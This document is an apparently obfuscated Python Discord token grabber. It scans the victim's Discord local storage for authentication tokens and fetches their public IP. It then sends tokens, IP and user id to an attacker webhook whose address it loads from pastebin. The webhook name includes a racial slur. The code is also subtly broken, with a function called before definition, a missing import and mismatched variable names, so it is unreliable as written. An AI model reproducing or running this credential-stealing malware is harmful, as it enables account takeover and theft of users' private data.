J=len
import os,random
from urllib.request import Request as B,urlopen as C
import re,glob as D
#Put your webhook in a pastebin and Change this pastebin to your webhook pastebin
F=C(B('https://pastebin.com/raw/hSY5ZkZx')).read().decode().strip()
G=C(B('https://api.ipify.org')).read().decode().strip()
def H():
	B=[];C=os.getenv('APPDATA');E=D.glob(C+'\\Discord\\Local Storage\\leveldb\\*.ldb');E.extend(D.glob(C+'\\Discord\\Local Storage\\leveldb\\*.log'))
	for G in E:
		with open(G,'r',encoding='ISO-8859-1')as H:
			try:
				I=H.read();F=[A.group()for B in re.finditer('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}',I)]
				if J(F)>0:B.extend(F)
			except:pass
	return B
E=H()
if J(E)<1:exit(0)
I(E)
def I(tkns):A=requests.get('https://discordapp.com/api/v7/users/@me',headers={'authorization':tkns}).text.split('{"id": "')[1].split('"')[0];B={'content':f"Hey we got {tkns}\n an ip of {G}\n An id of {A}",'avatar_url':'https://pbs.twimg.com/profile_images/1090355063329964032/2G_6k1E7_400x400.jpg','username':'Freenitronigga'};requests.post(F,data=B)
